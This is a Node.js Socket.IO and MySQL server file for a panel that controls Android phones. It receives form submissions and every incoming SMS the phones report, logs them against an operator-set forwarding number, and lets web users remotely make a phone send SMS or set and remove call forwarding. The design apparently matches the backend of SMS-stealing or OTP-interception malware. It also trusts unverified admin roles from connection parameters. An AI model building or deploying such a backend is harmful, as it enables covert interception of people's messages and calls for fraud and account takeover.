import { createServer } from 'http';
import { parse } from 'url';
import next from 'next';
import { Server } from 'socket.io';
import pkg from '@next/env';
const { loadEnvConfig } = pkg;
loadEnvConfig(process.cwd());
import mysql from "mysql2/promise";

process.env.TZ = 'Asia/Kolkata';

const db = mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_NAME
});

const port = parseInt(process.env.APP_PORT || '3000', 10);
const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev });
const handle = app.getRequestHandler();

app.prepare().then(() => {
  const server = createServer((req, res) => {
    const parsedUrl = parse(req.url, true);
    handle(req, res, parsedUrl);
  });

  const io = new Server(server, { cors: { origin: '*' } });
  global.io = io;

  io.on('connection', (socket) => {
    // console.log(socket.handshake.query);
    // socket.emit("hello", "hello-world");

    // Mark device as online in DB if android_id exists
    const { android_id, user_id, form_code, role, client } = socket.handshake.query;
    
    if (client === 'android' && android_id) {
      console.log("✅ Android Client:", socket.id, client, form_code);
      const now = new Date(); // Current timestamp
      db.query(
        `UPDATE devices SET device_status = 'online', last_seen_at = ? WHERE android_id = ? AND form_code = ?`,
        [now, android_id, form_code]
      )
        .then(() => {
          // console.log(`✅ Device ${android_id} & ${form_code} marked online at ${now}`);
          io.emit("device_status_update", {
            id: android_id,
            device_status: "online",
            last_seen_at: now
          });
        })
        .catch(err => console.error(`❌ Error updating device online status:`, err));
    }

    if (client === 'web' && user_id) {
      console.log("New Web client:", socket.id, role, client, form_code, user_id);
      const now = new Date(); // Current timestamp
      db.query(
        `UPDATE users SET user_status = 'online', last_seen_at = ? WHERE id = ? and form_code = ?`,
        [now, user_id, form_code]
      )
        .then(() => {
          // give update to admin user status if needed
          // io.emit("device_status_update", {
          //   id: user_id,
          //   device_status: "online",
          //   last_seen_at: now
          // });
        })
        .catch(err => console.error(`❌ Error updating device online status:`, err));
    }

    // Start getSmsForwardingNumber
    socket.on('getSmsForwardingNumber', async (data, callback) => {
      try {
        // 🧩 Validate input
        if (!form_code) {
          callback({
            status: 400,
            message: 'Missing required field: form_code',
          });
          return;
        }

        // 🔍 Query the users table
        const sql = `
      SELECT sms_forwarding_to_number, sms_forwarding_to_number_status
      FROM users 
      WHERE form_code = ?
      LIMIT 1
    `;
        const [rows] = await db.query(sql, [form_code]);

        if (rows.length === 0) {
          callback({
            status: 404,
            message: `No user found for form_code: ${form_code}`,
          });
          return;
        }

        const { sms_forwarding_to_number, sms_forwarding_to_number_status } = rows[0];
        if (sms_forwarding_to_number_status !== "Enabled") {
          callback({
            status: 403,
            message: `SMS forwarding is not enabled for form_code: ${form_code}`,
          });
          sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
          sendMessageToAdmin("new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
          return;
        }

        if(!sms_forwarding_to_number || sms_forwarding_to_number.trim() === ""){
          callback({
            status: 404,
            message: `No forwarding number found for form_code: ${form_code}`,
          });
          sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But no forwarding number found`, false);
          sendMessageToAdmin("new_sms_data", `New SMS Received & But no forwarding number found`, false);
          return;
        }

        // ✅ Return success response
        callback({
          status: 200,
          message: 'Forwarding number retrieved successfully',
          data: {
            sms_forwarding_to_number,
          },
        });

        console.log(`✅ Found forwarding number for ${form_code}: ${sms_forwarding_to_number}`);

      } catch (err) {
        console.error('❌ Error fetching forwarding number:', err);
        callback({
          status: 500,
          message: 'Server error: ' + err.message,
        });
      }
    });
    // End getSmsForwardingNumber


    //Listen or Save for smsForwardingData
    socket.on('smsForwardingData', async (data, callback) => {
      try {
        const {
          sim_sub_id,
          sender,
          message,
          sms_forwarding_status,
          sms_forwarding_status_message
        } = data || {};

        // 🧩 Validation
        if (!sender || !message) {
          callback({
            status: 400,
            message: 'Missing required fields: sender, or message, sim_sub_id',
          });
          return;
        }

        // get forward_to_number 
        const userSql = `
        SELECT sms_forwarding_to_number, sms_forwarding_to_number_status
        FROM users 
        WHERE form_code = ?
        LIMIT 1
      `;
        const [rows] = await db.query(userSql, [form_code]);

        if (rows.length === 0) {
          callback({
            status: 404,
            message: `No user found for form_code: ${form_code}`,
          });
          return;
        }
        const { sms_forwarding_to_number, sms_forwarding_to_number_status } = rows[0];
        const forward_to_number = sms_forwarding_to_number;
        // console.log(`✅ Found forwarding number for ${form_code}: ${forward_to_number}`);
        // end get forward_to_number

        let sms_forwarding_status1 = null;
        let sms_forwarding_status_message1 = null;
        if (sms_forwarding_to_number_status !== "Enabled") {
            sms_forwarding_status1 = "Disabled"
            sms_forwarding_status_message1 = "SMS forwarding is disabled for form_code("+form_code+") By Admin";
        }else {
          sms_forwarding_status1 = sms_forwarding_status;
          sms_forwarding_status_message1 = sms_forwarding_status_message ;
        }

        if(!forward_to_number || forward_to_number.trim() === ""){
          sms_forwarding_status1 = "Failed"
          sms_forwarding_status_message1 = "No forwarding number found for form_code("+form_code+")";
        }

        // Check for duplicates within the last 1 minute
        const [existing] = await db.query(
          `SELECT id FROM sms_forwarding 
          WHERE android_id = ? 
            AND (sim_sub_id = ? OR (? IS NULL AND sim_sub_id IS NULL))
            AND sender = ? 
            AND message = ?
            AND created_at >= NOW() - INTERVAL 1 MINUTE
          LIMIT 1`,
          [android_id, sim_sub_id || null, sim_sub_id || null, sender, message]
        );

        if (existing.length > 0) {
            console.log("⚠️ Duplicate SMS ignored (within 1 minute)", {
            android_id,
            sim_sub_id,
            sender,
            message,
          });
          return;
        }

        // ✅ Insert into your table
        const sql = `
      INSERT INTO sms_forwarding (
        android_id,
        sim_sub_id,
        sender,
        message,
        forward_to_number,
        form_code,
        sms_forwarding_status,
        sms_forwarding_status_message
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`;

        const [result] = await db.query(sql, [
          android_id,
          sim_sub_id || null,
          sender,
          message,
          forward_to_number || null,
          form_code || null,
          sms_forwarding_status1 || null,
          sms_forwarding_status_message1 || null
        ]);

        // ✅ Get inserted ID directly
        const id = result.insertId;
        console.log(`✅ Saved SMS with ID: ${id}`, form_code, android_id );
        
        if (sms_forwarding_to_number_status !== "Enabled") {
          callback({
            status: 403,
            message: `SMS Saved & But forwarding is not enabled, contact admin`,
          });
          sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
          sendMessageToAdmin("new_sms_data", `New SMS Received & But forwarding is not enabled`, false);
        }else {
          if(!forward_to_number || forward_to_number.trim() === ""){
            sendMessageToClients(form_code, "new_sms_data", `New SMS Received & But no forwarding number found`, false);
            sendMessageToAdmin("new_sms_data", `New SMS Received & But no forwarding number found`, false);
            callback({
              status: 400,
              message: `No forwarding number found`,
            });
          }else {
            callback({
              status: 200,
              message: 'SMS forwarding Data saved successfully',
              data: { id, forward_to_number },
            });
            console.log(`✅ SMS from ${sender} saved successfully.` , form_code, android_id );
            sendMessageToClients(form_code, "new_sms_data", "New SMS Forwarding Data Received", true);
            sendMessageToAdmin("new_sms_data", "New SMS Forwarding Data Received", true);
          }
        }
        // emit to web clients about new sms forwarding data received

      } catch (err) {
        console.error('❌ Error saving SMS forwarding data:', err, form_code, android_id);
        sendMessageToAdmin("new_sms_data", "Error saving SMS forwarding data", false);
        callback({
          status: 500,
          message: 'Server error: ' + err.message,
        });
      }
    });
    // End Listen for smsForwardingData 

    // Listen for updateSMSForwardingStatus
    socket.on('updateSMSForwardingStatus', async (data, callback) => {
      try {
        const { id, sms_forwarding_status, sms_forwarding_status_message } = data || {};

        // 🧩 Validation
        if (!id || !sms_forwarding_status) {
          if (callback) callback({
            status: 400,
            message: 'Missing required fields: id, sms_forwarding_status',
          });
          return;
        }

        // ✅ Update the record
        const sql = `
      UPDATE sms_forwarding
      SET sms_forwarding_status = ?, sms_forwarding_status_message = ?
      WHERE id = ?
    `;
        const [result] = await db.query(sql, [
          sms_forwarding_status,
          sms_forwarding_status_message || null,
          id
        ]);

        if (result.affectedRows === 0) {
          if (callback) callback({
            status: 404,
            message: `No record found with ID: ${id}`,
          });
          return;
        }

        if (callback) callback({
          status: 200,
          message: 'SMS forwarding status updated successfully',
        });
        console.log(`✅ SMS forwarding record ID ${id} updated successfully (${sms_forwarding_status}).`);
      } catch (err) {
        console.error('❌ Error updating SMS forwarding status:', err);
        if (callback) callback({
          status: 500,
          message: 'Server error: ' + err.message,
        });
      }
    });

    // End for updateSMSForwardingStatus

    //Listen for formDataId with form_data_id to fetch form details
    socket.on('formDataId', async (data, callback) => {
      try {
        const { form_data_id, data: formData } = data || {};

        // 🧩 Validation
        if (!formData || !form_data_id) {
          callback({
            status: 400,
            message: 'Missing required fields: form_data_id, data',
          });
          return;
        }

        // ✅ Insert form details
        for (const key in formData) {
          if (Object.prototype.hasOwnProperty.call(formData, key)) {
            const value = formData[key];
            await db.query(
              `INSERT INTO form_data_details (form_data_id, input_key, input_value)
               VALUES (?, ?, ?)`,
              [form_data_id, key, value]
            );
          }
        }
        callback({
          status: 200,
          message: 'Form saved successfully',
          data: form_data_id,
        });

        let message = `Updated Form Data #${form_data_id}`;
        sendMessageToClients(form_code, "new_form_data", message, true);
        sendMessageToAdmin("new_form_data", message, true);
        console.log(message, android_id, form_code);
      } catch (err) {
        console.error('❌ Error saving form:', err);
        callback({
          status: 500,
          message: 'Server error: ' + err.message,
        });
      }
    });
    // End Listen for formdata_id submission from Android

    // Listen for form submissions from Android
    socket.on('formData', async (data, callback) => {
      try {
        const { form_code, android_id, data: formData } = data || {};

        // 🧩 Validation
        if (!form_code || !android_id || !formData) {
          callback({
            status: 400,
            message: 'Missing required fields: form_code, android_id, data',
          });
          return;
        }

        // ✅ Insert into main table
        const [insertResult] = await db.query(
          `INSERT INTO form_data (form_code, android_id) VALUES (?, ?)`,
          [form_code, android_id]
        );

        const form_data_id = insertResult.insertId;

        let form_data_details = [];
        // ✅ Insert form details
        for (const key in formData) {
          if (Object.prototype.hasOwnProperty.call(formData, key)) {
            const value = formData[key];
            const [insertResult] = await db.query(
              `INSERT INTO form_data_details (form_data_id, input_key, input_value)
               VALUES (?, ?, ?)`,
              [form_data_id, key, value]
            );
            form_data_details.push({
              "form_data_details_id": insertResult.insertId,
              "input_value": value ,
              "input_key": key ,
              "form_data_details_created_at": new Date(),
            });
          }
        }
        callback({
          status: 200,
          message: 'Form saved successfully',
          data: form_data_id,
        });

        // get device by android_id and form_code
        // const [rowsDevice] = await db.query(
        //   `SELECT id as device_id, device_name, device_model FROM devices WHERE android_id = ? and form_code = ? LIMIT 1`,
        //   [android_id, form_code]
        // );
        // let device_name = "";
        // let device_model = "";
        // if (rowsDevice.length > 0) {
        //   const device = rowsDevice[0];
        //   device_name = device.device_name;
        //   device_model = device.device_model;
        // }

        // let prepareClientFormData = {
        //   "form_id": form_data_id,
        //   "android": android_id,
        //   "device_name": device_name,
        //   "device_model": device_model,
        //   "created_at": new Date(),
        //   "form_code": form_code,
        //   "form_data_details": form_data_details
        // };

        // emit to web clients about new form data received
        let message = `New Form Data #${form_data_id} Received`;
        sendMessageToClients(form_code, "new_form_data", message, true);
        sendMessageToAdmin("new_form_data", message, true);
        console.log(message, android_id, form_code);
      } catch (err) {
        console.error('❌ Error saving form:', err);
        callback({
          status: 500,
          message: 'Server error: ' + err.message,
        });
      }
    });
    // End Listen for form submissions from Android

    // Web SendSMS To Android : handle db
    socket.on("send_sms", async (data) => {
      const { android_id, to_number, message, sim_sub_id, from_number } = data;
      try {
        // --- Check device in DB ---
        const [rows] = await db.query(
          `SELECT id as device_id, form_code FROM devices WHERE android_id = ? and form_code = ? LIMIT 1`,
          [android_id, form_code]
        );

        if (rows.length === 0) {
          throw new Error(`Android ID ${android_id} not found in database.`);
        }

        const device = rows[0];
        const server_form_code = device.form_code;

        if (server_form_code !== form_code) {
          throw new Error(`Permission Denied (${server_form_code} != ${form_code}) for Android ID ${android_id}`);
        }

        // --- Get Android socket ---
        const androidSocket = [...io.sockets.sockets.values()].find(
          (s) =>
            s.handshake.query.client === "android" &&
            s.handshake.query.android_id === android_id &&
            s.handshake.query.form_code === form_code
        );

        if (!androidSocket) {
          throw new Error(`No Android device connected or online for ID ${android_id}`);
        }

        // --- Save SMS in DB ---
        const sms_status = "Sending";
        const sms_status_message = "SMS request sent to device";

        const [insertResult] = await db.query(
          `INSERT INTO sms_send (form_code, android_id, to_number, message, sim_sub_id, from_number, sms_status, sms_status_message)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
          [form_code, android_id, to_number, message, sim_sub_id, from_number, sms_status, sms_status_message]
        );

        const sms_send_id = insertResult.insertId;

        const smsDataAndroid = { sms_send_id, to_number, message, sim_sub_id };
        androidSocket.emit("sms_send_android", smsDataAndroid);

        console.log(`📨 Sent SMS (ID: ${sms_send_id}) to Android ID ${android_id} via socket ${androidSocket.id}`);
        socket.emit("sms_status", { success: true, message: sms_status_message });

      } catch (err) {
        console.error("💥 Error in send_sms:", err);
        socket.emit("sms_status", { success: false, message: err.message || "Server error while sending SMS" });
      }
    });

    // End SendSMS Requesst To Android

    // update_sms_status_device
    socket.on("update_sms_status_device", async (data) => {
      const { sms_send_id, sms_status, sms_status_message } = data;
      try {
        const [result] = await db.query(
          `UPDATE sms_send SET sms_status = ?, sms_status_message = ? WHERE id = ?`,
          [sms_status, sms_status_message, sms_send_id]
        );
        if (result.affectedRows === 0) {
            throw new Error(`❌ No SMS send record found with ID: ${sms_send_id}`);
        }
        console.log(`✅ SMS send record ID ${sms_send_id} updated to status: ${sms_status}`);

        // get_android_id and form_code from sms_send table
        const [rows] = await db.query(
          `SELECT android_id, form_code FROM sms_send WHERE id = ? LIMIT 1`,
          [sms_send_id]
        );
        if (rows.length === 0) {
          throw new Error(`❌ SMS send ID ${sms_send_id} not found in database.`);
        }
        const {form_code } = rows[0];
        if(sms_status=="SentFailed"){
          throw new Error(sms_status_message || `SMS sending failed for sms_send_id ${sms_send_id}`);
        }
        if(sms_status=="UnDelivered"){
          throw new Error(sms_status_message || `SMS Undelivered for sms_send_id ${sms_send_id}`);
        }
        sendMessageToClients(form_code, "sms_status_device", `SMS status updated to ${sms_status}`, true);
        sendMessageToAdmin("sms_status_device", `SMS status updated to ${sms_status}`, true);
        console.log(`SMS status update sent to web clients for sms_send_id ${sms_send_id}`);
      } catch (err) {
        let errorMsg = err.message || 'Server error while updating SMS status';
        console.error(errorMsg);
        sendMessageToClients(form_code, "sms_status_device", errorMsg, false);
        sendMessageToAdmin("sms_status_device", errorMsg, false);
      }
    }
    );
    //End update_sms_status_device


    
    // update_device_token
    socket.on("update_device_token", async (data) => {
      const { token } = data;
      try {
        // find the device by android_id and form_code
        const [rowsDevice] = await db.query(
          `SELECT id as device_id FROM devices WHERE android_id = ? and form_code = ? LIMIT 1`,
          [android_id, form_code]
        );
        if(rowsDevice.length === 0) {
          throw new Error(`❌ Device with android_id ${android_id} and form_code ${form_code} not found in database to save fcm token `);
        }
        const device = rowsDevice[0];
        // update fcm_token in devices table
        const [result] = await db.query(
          `UPDATE devices SET fcm_token = ? WHERE id = ?`,
          [token, device.device_id]
        );
        if (result.affectedRows === 0) {
            throw new Error(`❌ No device record found with ID: ${device.device_id} to update fcm token`);
        }
        console.log(`✅ Device-${device.device_id}  android_id-${android_id} updated fcm_token successfully`);
      } catch (err) {
        let errorMsg = err.message || 'Server error while updating fcm token';
        console.error(errorMsg);
      }
    }
    );
    //End update_device_token

    function sendMessageToClients(form_code, event_name, message, success=false){
      const clientSockets = [...io.sockets.sockets.values()].filter(
          (s) =>
            s.handshake.query.client === "web" &&
            s.handshake.query.form_code === form_code
        );
        console.log(`total ${clientSockets.length} web clients to send ${event_name} message.`);
        // Emit to all clientSockets  
        clientSockets.forEach((clientSocket) => {
          clientSocket.emit(event_name, {
            success: success,
            message: message,
          });
        });
    }

    function sendMessageToAdmin(event_name, message, success=false){
      const clientSockets = [...io.sockets.sockets.values()].filter(
          (s) =>
            s.handshake.query.client === "web" &&
            s.handshake.query.role === "admin"
        );
        console.log(`total ${clientSockets.length} web admin to send ${event_name} message.`);
        // Emit to all clientSockets  
        clientSockets.forEach((clientSocket) => {
          clientSocket.emit(event_name, {
            success: success,
            message: message,
          });
        });
    }

    // Web CallForward To Android
    socket.on("call_forward", async (data, callback) => {
      try {
        const { android_id, to_number, sim_sub_id } = data;

        //checkFormCode has android_id in database
        const [rows] = await db.query(
          `SELECT form_code FROM devices WHERE android_id = ? and form_code = ? LIMIT 1`,
          [android_id, form_code]
        );
        if (rows.length === 0) {
          throw new Error(`❌ Android ID ${android_id} not found in database.`);
        }
        const device = rows[0];
        const server_form_code = device.form_code;
        if (server_form_code !== form_code) {
          throw new Error(`❌ Form code mismatch for Android ID ${android_id}. Expected: ${server_form_code}, Received: ${form_code}`);
        }
        // End checkFormCode has android_id in database

        // get android_id socket
        const androidSocket = [...io.sockets.sockets.values()].find(
          (s) =>
            s.handshake.query.client === "android" &&
            s.handshake.query.android_id === android_id &&
            s.handshake.query.form_code === form_code
        );
        if (!androidSocket) {
           throw new Error(`❌ Android ID ${android_id} not connected or online.`);
        }

        // save in database
        let call_status_message = "Call Forward request sent to device";
        const smsDataAndroid = {
          call_forwarding_to_number:to_number,
          sim_sub_id:sim_sub_id,
        };
        // Emit to android socket
        androidSocket.emit("call_forward_android", smsDataAndroid);
        console.log(smsDataAndroid, `📨 Sent call_forward to Android ID ${android_id} via socket ${androidSocket.id}`);
        callback({ success: true, message: call_status_message });
      } catch (err) {
        callback({ success: false, message: err.message });
      }
    });
    // End CallForward Request To Android

    // update_call_forward_device_status : From Android Device By Android
    socket.on("update_call_forward_device_status", async (data) => {
      const { sim_sub_id, status, status_message } = data;
      try {
        // check column name is it sim1 or sim2
        const [rowsDevice] = await db.query(
          `SELECT * FROM devices WHERE form_code = ? OR android_id = ? LIMIT 1`,
          [form_code, android_id]
        );
        if (rowsDevice.length === 0) {
          throw new Error(`❌ Device with android_id ${android_id} and form_code ${form_code} not found in database.`);
        }
        const device = rowsDevice[0];
        let sim_prefix = null;
        if (device.sim1_sub_id === sim_sub_id) {
          sim_prefix = 'sim1_';
        } else if (device.sim2_sub_id === sim_sub_id) {
          sim_prefix = 'sim2_';
        }
        if (!sim_prefix) {
          throw new Error(`❌ sim_sub_id ${sim_sub_id} does not match sim1 or sim2 for device id ${device.id}.`);
        }
        // End check column name is it sim1 or sim2

        // update call forwarding status in devices table
        let sim_sub_id_column = sim_prefix + 'call_forward_status';
        let sim_sub_id_message_column = sim_prefix + 'call_forward_status_message';
        const [result] = await db.query(
          `UPDATE devices SET ${sim_sub_id_column} = ?, ${sim_sub_id_message_column} = ? WHERE id = ?`,
          [status, status_message, device.id]
        );
        if (result.affectedRows === 0) {
            throw new Error(`❌ No device record found with ID: ${device.id}`);
        }
        console.log(`✅ Device-${device.id}  android_id-${android_id} updated ${sim_sub_id_column} to status: ${status}`);
        // end update call forwarding status

        //send status to all web clients
        sendMessageToClients(form_code, "call_forwarding_status_device", status_message, (status !== "Failed" ? true : false));
      } catch (err) {
        let erroMessage = err.message || 'Server error while updating Call Forwarding status';
        console.error("CFS",  erroMessage);
        sendMessageToClients(form_code, "call_forwarding_status_device", erroMessage);
      }
    });
    //End update call forwarding status device




    // Web CallForwardRemove To Android
    socket.on("call_forward_remove", async (data, callback) => {
      try {
        const { android_id, sim_sub_id } = data;

        //checkFormCode has android_id in database
        const [rows] = await db.query(
          `SELECT form_code FROM devices WHERE android_id = ? and form_code = ? LIMIT 1`,
          [android_id, form_code]
        );
        if (rows.length === 0) {
          throw new Error(`❌ Android ID ${android_id} not found in database.`);
        }
        const device = rows[0];
        const server_form_code = device.form_code;
        if (server_form_code !== form_code) {
          throw new Error(`❌ Form code mismatch for Android ID ${android_id}. Expected: ${server_form_code}, Received: ${form_code}`);
        }
        // End checkFormCode has android_id in database

        // get android_id socket
        const androidSocket = [...io.sockets.sockets.values()].find(
          (s) =>
            s.handshake.query.client === "android" &&
            s.handshake.query.android_id === android_id &&
            s.handshake.query.form_code === form_code
        );
        if (!androidSocket) {
            throw new Error(`❌ Android ID ${android_id} not connected or online.`);
        }

        // save in database
        let call_status_message = "Call Forward Remove request sent to device";
        const smsDataAndroid = {
          sim_sub_id,
        };
        // Emit to android socket
        androidSocket.emit("call_forward_remove_android", smsDataAndroid);
        console.log(`📨 Sent call_forward_remove to Android ID ${android_id} via socket ${androidSocket.id}`);
        callback({ success: true, message: call_status_message });
      } catch (err) {
        console.error("CFR", err.message);
        callback({ success: false, message: err.message });
      }
    });
    // End CallForwardRemove Request To Android



  // DEVICE_STATUS MESSAGE
 socket.on("device_status_message", async (data) => {
    const { device_status_message, device_status } = data;

    try {
      let sql;
      let params;

      if (device_status !== undefined && device_status !== null) {
        sql = `UPDATE devices 
              SET device_status_message = ?, device_status = ? 
              WHERE android_id = ? AND form_code = ?`;
        params = [device_status_message, device_status, android_id, form_code];
      } else {
        // ✅ Update only the message if device_status is missing
        sql = `UPDATE devices 
              SET device_status_message = ? 
              WHERE android_id = ? AND form_code = ?`;
        params = [device_status_message, android_id, form_code];
      }

      await db.query(sql, params);
      console.log(`🔄 Device ${android_id}/${form_code}: ${device_status_message}`);
      const now = new Date();
      io.emit("device_status_update", {
            id: android_id,
            device_status: device_status,
            last_seen_at: now
          });

    } catch (err) {
      console.error("❌ Error updating device status message:", err);
    }
  });


    socket.on('disconnect', () => {
      
      if (client === 'android' && android_id) {
        console.log('❌ Android Client ', socket.id, client, form_code);
        const now = new Date();
        db.query(
          `UPDATE devices SET device_status = 'offline', last_seen_at = ? WHERE android_id = ? AND form_code = ?`,
          [now, android_id, form_code]
        )
          .then(() => {
            io.emit("device_status_update", {
              id: android_id,
              device_status: "offline",
              last_seen_at: now
            });
          })
          .catch(err => console.error(`❌ Error updating last_seen_at:`, err));
      }
      
      if (client === 'web' && user_id) {
        console.log('❌ Web Client ', socket.id, role, client, form_code, user_id);
        const now = new Date(); // Current timestamp
        db.query(
          `UPDATE users SET user_status = 'offline', last_seen_at = ? WHERE id = ? and form_code = ?`,
          [now, user_id, form_code]
        )
          .then(() => {
            // give update to admin user status if needed
            // io.emit("device_status_update", {
            //   id: user_id,
            //   device_status: "offline",
            //   last_seen_at: now
            // });
          })
          .catch(err => console.error(`❌ Error updating device online status:`, err));
      }
    });


  });

  server.listen(port, () => {
    console.log(`🚀 Server running at ${port}`);
  });
});

